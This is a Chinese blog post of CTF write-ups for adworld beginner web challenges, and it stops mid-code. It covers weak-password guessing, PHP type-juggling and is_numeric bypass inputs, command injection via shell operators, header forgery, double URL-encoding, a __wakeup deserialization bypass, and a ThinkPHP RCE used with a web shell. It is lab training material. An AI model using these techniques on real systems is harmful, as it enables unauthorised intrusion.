<!DOCTYPE html><html lang="zh-CN" data-default-color-scheme="light"><link rel="canonical" href="https://fanllspd.com/posts/df9d333d/"><head><meta charset="UTF-8"><link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.ico"><link rel="icon" href="/img/favicon.ico"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=5,shrink-to-fit=no"><meta http-equiv="x-ua-compatible" content="ie=edge"><meta name="theme-color" content="#dff9fb"><meta name="author" content="Fanllspd"><meta name="keywords" content="blog"><meta name="description" content="Webview_source X老师让小宁同学查看一个网页的源代码，但小宁同学发现鼠标右键好像不管用了。   点击开发人员工具即可 robots X老师上课讲了Robots协议，小宁同学却上课打了瞌睡，赶紧来教教小宁Robots协议是什么吧。  如题，访问 &#x2F;robots.txt 即可 backup X老师忘记删除备份文件，他派小宁同学去把备份文件找出来,一起来帮小宁同学吧！   猜测 index"><meta property="og:type" content="article"><meta property="og:title" content="adworld"><meta property="og:url" content="https://fanllspd.com/posts/df9d333d/index.html"><meta property="og:site_name" content="Fanllspd&#39;s Blog"><meta property="og:description" content="Webview_source X老师让小宁同学查看一个网页的源代码，但小宁同学发现鼠标右键好像不管用了。   点击开发人员工具即可 robots X老师上课讲了Robots协议，小宁同学却上课打了瞌睡，赶紧来教教小宁Robots协议是什么吧。  如题，访问 &#x2F;robots.txt 即可 backup X老师忘记删除备份文件，他派小宁同学去把备份文件找出来,一起来帮小宁同学吧！   猜测 index"><meta property="og:locale" content="zh_CN"><meta property="og:image" content="https://fanllspd.com/index_img/adworld2.png"><meta property="article:published_time" content="2024-03-19T12:29:48.000Z"><meta property="article:modified_time" content="2024-03-22T15:26:11.126Z"><meta property="article:author" content="Fanllspd"><meta property="article:tag" content="CTF"><meta name="twitter:card" content="summary_large_image"><meta name="twitter:image" content="https://fanllspd.com/index_img/adworld2.png"><meta name="referrer" content="no-referrer-when-downgrade"><title>adworld - Fanllspd&#39;s Blog</title><link rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css"><link rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css"><link rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css"><link rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css"><link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css"><link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css"><link rel="stylesheet" href="/css/main.css"><link id="highlight-css" rel="stylesheet" href="/css/highlight.css"><link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css"><link rel="stylesheet" href="/css/cloudedGlass.css"><link rel="stylesheet" href="/css/walineBg.css"><link rel="stylesheet" href="/css/scrollAnimation.css"><link rel="stylesheet" href="/css/macpanel.css"><link rel="stylesheet" href="/css/CatLoading.css"><link rel="stylesheet" href="/css/backgroundize.css"><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css"><script id="fluid-configs">var Fluid=window.Fluid||{};Fluid.ctx=Object.assign({},Fluid.ctx);var CONFIG={hostname:"fanllspd.com",root:"/",version:"1.9.5",typing:{enable:!0,typeSpeed:80,cursorChar:"_",loop:!0,scope:[]},anchorjs:{enable:!0,element:"h1,h2,h3,h4,h5,h6",placement:"left",visible:"hover",icon:""},progressbar:{enable:!0,height_px:3,color:"#2299dd",options:{easing:"ease",speed:500,showSpinner:!1,trickleSpeed:100}},code_language:{enable:!0,default:"TEXT"},copy_btn:!0,image_caption:{enable:!0},image_zoom:{enable:!0,img_url_replace:["",""]},toc:{enable:!0,placement:"right",headingSelector:"h1,h2,h3,h4,h5,h6",collapseDepth:0},lazyload:{enable:!0,loading_img:"/img/loading.gif",onlypost:!1,offset_factor:2},web_analytics:{enable:!0,follow_dnt:!0,baidu:null,google:{measurement_id:null},tencent:{sid:null,cid:null},woyaola:null,cnzz:null,leancloud:{app_id:null,app_key:null,server_url:null,path:"window.location.pathname",ignore_local:!1}},search_path:"/local-search.xml",include_content_in_search:!0};if(CONFIG.web_analytics.follow_dnt){var dntVal=navigator.doNotTrack||window.doNotTrack||navigator.msDoNotTrack;Fluid.ctx.dnt=dntVal&&(dntVal.startsWith("1")||dntVal.startsWith("yes")||dntVal.startsWith("on"))}</script><script src="/js/utils.js"></script><script src="/js/color-schema.js"></script><script async>Fluid.ctx.dnt||Fluid.utils.createScript("https://www.googletagmanager.com/gtag/js?id=",(function(){function a(){dataLayer.push(arguments)}window.dataLayer=window.dataLayer||[],a("js",new Date),a("config","")}))</script><meta name="generator" content="Hexo 6.3.0"></head><body><div id="loading-box"><div class="cat__scene"><div class="cat__main"><div class="cat__body"></div><div class="cat__body"></div><div class="cat__tail"></div><div class="cat__head"></div></div></div></div><header><div class="header-inner" style="height:70vh"><nav id="navbar" class="navbar fixed-top navbar-expand-lg navbar-dark scrolling-navbar"><div class="container"><a class="navbar-brand" href="/"><strong>悟已往之不谏，知来者之可追</strong> </a><button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation"><div class="animated-icon"><span></span><span></span><span></span></div></button><div class="collapse navbar-collapse" id="navbarSupportedContent"><ul class="navbar-nav ml-auto text-center"><li class="nav-item"><a class="nav-link" href="/"><i class="iconfont icon-home-fill"></i> <span class="nav-link-text">首页</span></a></li><li class="nav-item"><a class="nav-link" href="/archives/"><i class="iconfont icon-archive-fill"></i> <span class="nav-link-text">归档</span></a></li><li class="nav-item"><a class="nav-link" href="/categories/"><i class="iconfont icon-category-fill"></i> <span class="nav-link-text">分类</span></a></li><li class="nav-item"><a class="nav-link" href="/tags/"><i class="iconfont icon-tags-fill"></i> <span class="nav-link-text">标签</span></a></li><li class="nav-item"><a class="nav-link" href="/about/"><i class="iconfont icon-user-fill"></i> <span class="nav-link-text">关于</span></a></li><li class="nav-item"><a class="nav-link" href="/links/"><i class="iconfont icon-link-fill"></i> <span class="nav-link-text">友链</span></a></li><li class="nav-item" id="search-btn"><a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search"><i class="iconfont icon-search"></i></a></li><li class="nav-item" id="color-toggle-btn"><a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle"><i class="iconfont icon-dark" id="color-toggle-icon"></i></a></li></ul></div></div></nav><div id="banner" class="banner" parallax="true" style="background:url(/index_img/adworld2.png) no-repeat center center;background-size:cover"><div class="full-bg-img"><div class="mask flex-center" style="background-color:rgba(0,0,0,.3)"><div class="banner-text text-center fade-in-up"><div class="h2"><span id="subtitle" data-typed-text="adworld"></span></div><div class="mt-3"><span class="post-meta mr-2"><i class="iconfont icon-author" aria-hidden="true"></i> Fanllspd </span><span class="post-meta"><i class="iconfont icon-date-fill" aria-hidden="true"></i> <time datetime="2024-03-19 20:29" pubdate>2024年3月19日 晚上</time></span></div><div class="mt-1"><span class="post-meta mr-2"><i class="iconfont icon-chart"></i> 27k 字 </span><span class="post-meta mr-2"><i class="iconfont icon-clock-fill"></i> 223 分钟 </span><span id="busuanzi_container_page_pv" style="display:none"><i class="iconfont icon-eye" aria-hidden="true"></i> <span id="busuanzi_value_page_pv"></span> 次</span></div></div></div></div></div></div></header><main><div class="container-fluid nopadding-x"><div class="row nomargin-x"><div class="side-col d-none d-lg-block col-lg-2"><aside class="sidebar category-bar" style="margin-right:-1rem"><div class="category-list"><div class="category row nomargin-x"><a class="category-item list-group-item category-item-action col-10 col-md-11 col-xm-11" title="CTF" id="heading-59db9139e685f7d6a4a8784f9221066f" role="tab" data-toggle="collapse" href="#collapse-59db9139e685f7d6a4a8784f9221066f" aria-expanded="true">CTF <span class="list-group-count">(12)</span> <i class="iconfont icon-arrowright"></i></a><div class="category-collapse collapse show" id="collapse-59db9139e685f7d6a4a8784f9221066f" role="tabpanel" aria-labelledby="heading-59db9139e685f7d6a4a8784f9221066f"><div class="category-post-list"><a href="/posts/43716/" title="CNSS 2023 Recruit WriteUps~~~" class="list-group-item list-group-item-action"><span class="category-post">CNSS 2023 Recruit WriteUps~~~</span> </a><a href="/posts/3f2e31d4/" title="DiceCtf 2024 Quals Web WriteUps" class="list-group-item list-group-item-action"><span class="category-post">DiceCtf 2024 Quals Web WriteUps</span> </a><a href="/posts/b4162f1f/" title="HGAME 2024 WEEK-1 WriteUps" class="list-group-item list-group-item-action"><span class="category-post">HGAME 2024 WEEK-1 WriteUps</span> </a><a href="/posts/feba5816/" title="HGAME-2024-WEEK-2 WriteUps" class="list-group-item list-group-item-action"><span class="category-post">HGAME-2024-WEEK-2 WriteUps</span> </a><a href="/posts/7bf98902/" title="HGAME-2024-WEEK-3 WriteUps" class="list-group-item list-group-item-action"><span class="category-post">HGAME-2024-WEEK-3 WriteUps</span> </a><a href="/posts/5ae288a7/" title="HNCTF-2024" class="list-group-item list-group-item-action"><span class="category-post">HNCTF-2024</span> </a><a href="/posts/c220aa1/" title="My-First-Penetration" class="list-group-item list-group-item-action"><span class="category-post">My-First-Penetration</span> </a><a href="/posts/a932742f/" title="NSSCTF-Round#20-Basic-WEB" class="list-group-item list-group-item-action"><span class="category-post">NSSCTF-Round#20-Basic-WEB</span> </a><a href="/posts/29460/" title="Viking 2023 Recruit WriteUps~~~" class="list-group-item list-group-item-action"><span class="category-post">Viking 2023 Recruit WriteUps~~~</span> </a><a href="/posts/df9d333d/" title="adworld" class="list-group-item list-group-item-action active"><span class="category-post">adworld</span> </a><a href="/posts/14e77824/" title="qsnctf-2024#Round1" class="list-group-item list-group-item-action"><span class="category-post">qsnctf-2024#Round1</span> </a><a href="/posts/34863/" title="有长度限制的RCE注入" class="list-group-item list-group-item-action"><span class="category-post">有长度限制的RCE注入</span></a></div></div></div></div></aside></div><div class="col-lg-8 nopadding-x-md"><div class="container nopadding-x-md" id="board-ctn"><div id="board"><article class="post-content mx-auto"><h1 id="seo-header">adworld</h1><p class="note note-info">本文最后更新于：2 个月前</p><div class="markdown-body"><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="view-source"><a href="#view-source" class="headerlink" title="view_source"></a>view_source</h2><blockquote><p>X老师让小宁同学查看一个网页的源代码，但小宁同学发现鼠标右键好像不管用了。</p></blockquote><p><img src="/posts/df9d333d/image-20240321174903818.png" srcset="/img/loading.gif" lazyload alt="image-20240321174903818"></p><p>点击<strong>开发人员工具</strong>即可</p><h2 id="robots"><a href="#robots" class="headerlink" title="robots"></a>robots</h2><blockquote><p>X老师上课讲了Robots协议，小宁同学却上课打了瞌睡，赶紧来教教小宁Robots协议是什么吧。</p></blockquote><p>如题，访问 <code>/robots.txt</code> 即可</p><h2 id="backup"><a href="#backup" class="headerlink" title="backup"></a>backup</h2><blockquote><p>X老师忘记删除备份文件，他派小宁同学去把备份文件找出来,一起来帮小宁同学吧！</p></blockquote><p><img src="/posts/df9d333d/image-20240322172004145.png" srcset="/img/loading.gif" lazyload alt="image-20240322172004145"></p><p>猜测 <code>index.php.bak</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python">&lt;html&gt;<br>&lt;head&gt;<br>    &lt;meta charset=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;<br>    &lt;title&gt;备份文件&lt;/title&gt;<br>    &lt;link href=<span class="hljs-string">&quot;http://libs.baidu.com/bootstrap/3.0.3/css/bootstrap.min.css&quot;</span> rel=<span class="hljs-string">&quot;stylesheet&quot;</span> /&gt;<br>    &lt;style&gt;<br>        body&#123;<br>            margin-left:auto;<br>            margin-right:auto;<br>            margin-TOP:200PX;<br>            width:20em;<br>        &#125;<br>    &lt;/style&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>&lt;h3&gt;你知道index.php的备份文件名吗？&lt;/h3&gt;<br>&lt;?php<br>$flag=<span class="hljs-string">&quot;Cyberpeace&#123;855A1C4B3401294CB6604CCC98BDE334&#125;&quot;</span><br>?&gt;<br>&lt;/body&gt;<br>&lt;/html&gt;<br><br></code></pre></td></tr></table></figure><h2 id="cookie"><a href="#cookie" class="headerlink" title="cookie"></a>cookie</h2><blockquote><p>X老师告诉小宁他在cookie里放了些东西，小宁疑惑地想：‘这是夹心饼干的意思吗？’</p></blockquote><p>F12 查看 cookie</p><p><img src="/posts/df9d333d/image-20240322172120878.png" srcset="/img/loading.gif" lazyload alt="image-20240322172120878"></p><p><img src="/posts/df9d333d/image-20240322172152637.png" srcset="/img/loading.gif" lazyload alt="image-20240322172152637"></p><h2 id="disabled-button"><a href="#disabled-button" class="headerlink" title="disabled_button"></a>disabled_button</h2><blockquote><p>X老师今天上课讲了前端知识，然后给了大家一个不能按的按钮，小宁惊奇地发现这个按钮按不下去，到底怎么才能按下去呢？</p></blockquote><p><img src="/posts/df9d333d/image-20240322172330655.png" srcset="/img/loading.gif" lazyload alt="image-20240322172330655"></p><p>F12 删掉 disabled 再点击即可</p><p><img src="/posts/df9d333d/image-20240322172413327.png" srcset="/img/loading.gif" lazyload alt="image-20240322172413327"></p><h2 id="get-post"><a href="#get-post" class="headerlink" title="get_post"></a>get_post</h2><blockquote><p>X老师告诉小宁同学HTTP通常使用两种请求方法，你知道是哪两种吗？</p></blockquote><p><code>curl -X POST http://61.147.171.105:53979/?a=1 -d &quot;b=2&quot;</code></p><p><img src="/posts/df9d333d/image-20240322172558929.png" srcset="/img/loading.gif" lazyload alt="image-20240322172558929"></p><h2 id="weak-auth"><a href="#weak-auth" class="headerlink" title="weak_auth"></a>weak_auth</h2><blockquote><p>小宁写了一个登陆验证页面，随手就设了一个密码。</p></blockquote><p>弱密码</p><p><img src="/posts/df9d333d/image-20240322172651557.png" srcset="/img/loading.gif" lazyload alt="image-20240322172651557"></p><p>弱密码猜测 admin&#x2F;123456</p><p><img src="/posts/df9d333d/image-20240322172716643.png" srcset="/img/loading.gif" lazyload alt="image-20240322172716643"></p><h2 id="simple-php"><a href="#simple-php" class="headerlink" title="simple_php"></a>simple_php</h2><blockquote><p>小宁听说php是最好的语言,于是她简单学习之后写了几行php代码。</p></blockquote><p>PHP 弱类型</p><p><img src="/posts/df9d333d/image-20240322172844038.png" srcset="/img/loading.gif" lazyload alt="image-20240322172844038"></p><p>在PHP中，当使用双等号（&#x3D;&#x3D;）进行比较时，如果比较的两个值类型不同，PHP会尝试将它们转换为相同的类型然后再进行比较。在这种情况下，字符串和整数进行比较时，字符串会被尝试转换为数字。</p><p>在PHP中，如果字符串不是以有效的数值开头，它会被转换为0。</p><p>故传入 <code>a=a</code></p><h3 id="绕过方法"><a href="#绕过方法" class="headerlink" title="绕过方法"></a>绕过方法</h3><p>is_numeric函数对于空字符%00，无论是%00放在前后都可以判断为非数值，而%20空格字符只能放在数值后，因为查看函数发现该函数对于第一个空格字符会跳过空格字符直接判断后面的内容</p><p><strong>构造：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php">?b = <span class="hljs-number">1235</span>%<span class="hljs-number">00</span><br>?b = <span class="hljs-number">1235</span>%<span class="hljs-number">20</span><br>?b = <span class="hljs-number">1235</span><span class="hljs-string">&#x27;</span><br><span class="hljs-string">?b = 1235a</span><br></code></pre></td></tr></table></figure><p>得<img src="/posts/df9d333d/image-20240322173700567.png" srcset="/img/loading.gif" lazyload alt="image-20240322173700567"></p><h2 id="command-execution"><a href="#command-execution" class="headerlink" title="command_execution"></a>command_execution</h2><blockquote><p>小宁写了个ping功能,但没有写waf,X老师告诉她这是非常危险的，你知道为什么吗。</p></blockquote><ul><li>管道符号截断命令执行</li></ul><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs 1c"><span class="hljs-meta">&amp; 表示任务后台执行</span><br><span class="hljs-string">| 上一条命令的输出，作为下一条命令参数(输入)</span><br><span class="hljs-meta">&amp;&amp; 表示前一条命令执行成功时，才执行后一条命令</span><br><span class="hljs-string">|| 表示上一条命令执行失败后，才执行下一条命令</span><br></code></pre></td></tr></table></figure><p><img src="/posts/df9d333d/image-20240322174223866.png" srcset="/img/loading.gif" lazyload alt="image-20240322174223866"></p><p>根目录和当前目录都无，于是 find 命令从 <code>/</code> 寻找 flag 文件</p><p><img src="/posts/df9d333d/image-20240322174144114.png" srcset="/img/loading.gif" lazyload alt="image-20240322174144114"></p><h2 id="Training-WWW-Robots"><a href="#Training-WWW-Robots" class="headerlink" title="Training-WWW-Robots"></a>Training-WWW-Robots</h2><p>根据提示访问 <code>/robots.txt</code></p><p><img src="/posts/df9d333d/image-20240322174755142.png" srcset="/img/loading.gif" lazyload alt="image-20240322174755142"></p><p>继续访问即可</p><h2 id="xff-referer"><a href="#xff-referer" class="headerlink" title="xff_referer"></a>xff_referer</h2><blockquote><p>X老师告诉小宁其实xff和referer是可以伪造的。</p></blockquote><ul><li>header 伪造</li></ul><p><img src="/posts/df9d333d/image-20240322174839095.png" srcset="/img/loading.gif" lazyload alt="image-20240322174839095"></p><p>根据提示，追加 <code>X-Forwarded-For</code></p><p><img src="/posts/df9d333d/image-20240322174948752.png" srcset="/img/loading.gif" lazyload alt="image-20240322174948752"></p><p>得到<img src="/posts/df9d333d/image-20240322175002381.png" srcset="/img/loading.gif" lazyload alt="image-20240322175002381"></p><p>追加 <code>Referer</code></p><p><img src="/posts/df9d333d/image-20240322175049210.png" srcset="/img/loading.gif" lazyload alt="image-20240322175049210"></p><p>得到<img src="/posts/df9d333d/image-20240322175106777.png" srcset="/img/loading.gif" lazyload alt="image-20240322175106777"></p><h2 id="baby-web"><a href="#baby-web" class="headerlink" title="baby_web"></a>baby_web</h2><blockquote><p>想想初始页面是哪个</p></blockquote><p>根据提示访问 <code>index.php</code></p><p><img src="/posts/df9d333d/image-20240322175320221.png" srcset="/img/loading.gif" lazyload alt="image-20240322175320221"></p><p>发现 <strong>302跳转</strong> 于是使用 curl</p><p><img src="/posts/df9d333d/image-20240322175406158.png" srcset="/img/loading.gif" lazyload alt="image-20240322175406158"></p><p>猜测在响应标头，使用 <code>-i</code> 显示</p><p><img src="/posts/df9d333d/image-20240322175533400.png" srcset="/img/loading.gif" lazyload alt="image-20240322175533400"></p><h2 id="simple-js"><a href="#simple-js" class="headerlink" title="simple_js"></a>simple_js</h2><blockquote><p>小宁发现了一个网页，但却一直输不对密码。(Flag格式为 Cyberpeace{xxxxxxxxx} ）</p></blockquote><p>F12 得到</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">dechiffre</span>(<span class="hljs-params">pass_enc</span>) &#123;<br>    <span class="hljs-keyword">var</span> pass = <span class="hljs-string">&quot;70,65,85,88,32,80,65,83,83,87,79,82,68,32,72,65,72,65&quot;</span>;<br>    <span class="hljs-keyword">var</span> tab = pass_enc.<span class="hljs-title function_">split</span>(<span class="hljs-string">&#x27;,&#x27;</span>);<br>    <span class="hljs-keyword">var</span> tab2 = pass.<span class="hljs-title function_">split</span>(<span class="hljs-string">&#x27;,&#x27;</span>);<br>    <span class="hljs-keyword">var</span> i, j, k, l = <span class="hljs-number">0</span>,<br>        m, n, o, p = <span class="hljs-string">&quot;&quot;</span>;<br>    i = <span class="hljs-number">0</span>;<br>    j = tab.<span class="hljs-property">length</span>;<br>    k = j + (l) + (n = <span class="hljs-number">0</span>);<br>    n = tab2.<span class="hljs-property">length</span>;<br>    <span class="hljs-keyword">for</span> (i = (o = <span class="hljs-number">0</span>); i &lt; (k = j = n); i++) &#123;<br>        o = tab[i - l];<br>        p += <span class="hljs-title class_">String</span>.<span class="hljs-title function_">fromCharCode</span>((o = tab2[i]));<br>        <span class="hljs-keyword">if</span> (i == <span class="hljs-number">5</span>) <span class="hljs-keyword">break</span>;<br>    &#125;<br>    <span class="hljs-keyword">for</span> (i = (o = <span class="hljs-number">0</span>); i &lt; (k = j = n); i++) &#123;<br>        o = tab[i - l];<br>        <span class="hljs-keyword">if</span> (i &gt; <span class="hljs-number">5</span> &amp;&amp; i &lt; k - <span class="hljs-number">1</span>)<br>            p += <span class="hljs-title class_">String</span>.<span class="hljs-title function_">fromCharCode</span>((o = tab2[i]));<br>    &#125;<br>    p += <span class="hljs-title class_">String</span>.<span class="hljs-title function_">fromCharCode</span>(tab2[<span class="hljs-number">17</span>]);<br>    pass = p;<br>    <span class="hljs-keyword">return</span> pass;<br>&#125;<br><span class="hljs-title class_">String</span>[<span class="hljs-string">&quot;fromCharCode&quot;</span>](<span class="hljs-title function_">dechiffre</span>(<span class="hljs-string">&quot;\x35\x35\x2c\x35\x36\x2c\x35\x34\x2c\x37\x39\x2c\x31\x31\x35\x2c\x36\x39\x2c\x31\x31\x34\x2c\x31\x31\x36\x2c\x31\x30\x37\x2c\x34\x39\x2c\x35\x30&quot;</span>));<br><br>h = <span class="hljs-variable language_">window</span>.<span class="hljs-title function_">prompt</span>(<span class="hljs-string">&#x27;Enter password&#x27;</span>);<br><span class="hljs-title function_">alert</span>(<span class="hljs-title function_">dechiffre</span>(h));<br></code></pre></td></tr></table></figure><p>乍一看要解密，其实没关系</p><p>取出 <code>\x35\x35\x2c\x35\x36\x2c\x35\x34\x2c\x37\x39\x2c\x31\x31\x35\x2c\x36\x39\x2c\x31\x31\x34\x2c\x31\x31\x36\x2c\x31\x30\x37\x2c\x34\x39\x2c\x35\x30</code></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<br>  <span class="hljs-title class_">String</span>.<span class="hljs-title function_">fromCharCode</span>(<br>    ...<span class="hljs-string">&#x27;\x35\x35\x2c\x35\x36\x2c\x35\x34\x2c\x37\x39\x2c\x31\x31\x35\x2c\x36\x39\x2c\x31\x31\x34\x2c\x31\x31\x36\x2c\x31\x30\x37\x2c\x34\x39\x2c\x35\x30&#x27;</span>.<span class="hljs-title function_">split</span>(<br>      <span class="hljs-string">&#x27;,&#x27;</span><br>    )<br>  )<br>)<br></code></pre></td></tr></table></figure><p><img src="/posts/df9d333d/image-20240322180631459.png" srcset="/img/loading.gif" lazyload alt="image-20240322180631459"></p><p>Cyberpeace{} 包裹即可</p><ul><li>三个点（…）是展开运算符</li></ul><h2 id="PHP2"><a href="#PHP2" class="headerlink" title="PHP2"></a>PHP2</h2><p>点开啥都没有</p><p>dirsearch 启动</p><p><img src="/posts/df9d333d/image-20240322192946012.png" srcset="/img/loading.gif" lazyload alt="image-20240322192946012"></p><p>得到</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span>(<span class="hljs-string">&quot;admin&quot;</span>===<span class="hljs-variable">$_GET</span>[id]) &#123;<br>  <span class="hljs-keyword">echo</span>(<span class="hljs-string">&quot;&lt;p&gt;not allowed!&lt;/p&gt;&quot;</span>);<br>  <span class="hljs-keyword">exit</span>();<br>&#125;<br><br><span class="hljs-variable">$_GET</span>[id] = <span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$_GET</span>[id]);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[id] == <span class="hljs-string">&quot;admin&quot;</span>)<br>&#123;<br>  <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;p&gt;Access granted!&lt;/p&gt;&quot;</span>;<br>  <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;p&gt;Key: xxxxxxx &lt;/p&gt;&quot;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br><br>Can you anthenticate to this website?<br></code></pre></td></tr></table></figure><p>可以看出来是二次渲染</p><p><code>http://61.147.171.105:64045/?id=%2561dmin</code></p><p>浏览器请求的时候会把 <code>%25</code> 编码为 <code>%</code></p><p>所以传上去的数据为 <code>%61dmin</code></p><p><img src="/posts/df9d333d/image-20240322193654694.png" srcset="/img/loading.gif" lazyload alt="image-20240322193654694"></p><h2 id="ics-06"><a href="#ics-06" class="headerlink" title="ics-06"></a>ics-06</h2><blockquote><p>云平台报表中心收集了设备管理基础服务的数据，但是数据被删除了，只有一处留下了入侵者的痕迹。</p></blockquote><p>报表中心可跳转</p><p><img src="/posts/df9d333d/image-20240322193823659.png" srcset="/img/loading.gif" lazyload alt="image-20240322193823659"></p><p>没想到，看wp复现的</p><p>原来是个爆破</p><p><img src="/posts/df9d333d/image-20240322194648529.png" srcset="/img/loading.gif" lazyload alt="image-20240322194648529"></p><p><img src="/posts/df9d333d/image-20240322194700663.png" srcset="/img/loading.gif" lazyload alt="image-20240322194700663"></p><p><img src="/posts/df9d333d/image-20240322194710931.png" srcset="/img/loading.gif" lazyload alt="image-20240322194710931"></p><h2 id="unserialize3"><a href="#unserialize3" class="headerlink" title="unserialize3"></a>unserialize3</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">xctf</span></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$flag</span> = <span class="hljs-string">&#x27;111&#x27;</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-keyword">exit</span>(<span class="hljs-string">&#x27;bad requests&#x27;</span>);<br>&#125;<br>?code=<br></code></pre></td></tr></table></figure><p>绕 <code>__wakeup</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">xctf</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$flag</span> = <span class="hljs-string">&#x27;111&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">exit</span>(<span class="hljs-string">&#x27;bad requests&#x27;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">xctf</span>();<br><span class="hljs-variable">$a</span>-&gt;flag = <span class="hljs-string">&#x27;flag&#x27;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>得到<code>O:4:&quot;xctf&quot;:1:&#123;s:4:&quot;flag&quot;;s:4:&quot;flag&quot;;&#125;</code></p><p>修改 xctf 后的数字为 1 以上即可</p><p><img src="/posts/df9d333d/image-20240322195352906.png" srcset="/img/loading.gif" lazyload alt="image-20240322195352906"></p><h2 id="php-rce"><a href="#php-rce" class="headerlink" title="php_rce"></a>php_rce</h2><p>tp 漏洞</p><p><img src="/posts/df9d333d/image-20240322195554478.png" srcset="/img/loading.gif" lazyload alt="image-20240322195554478"></p><p>蚁剑连接，访问根目录即可</p><h2 id="Web-php-include"><a href="#Web-php-include" class="headerlink" title="Web_php_include"></a>Web_php_include</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 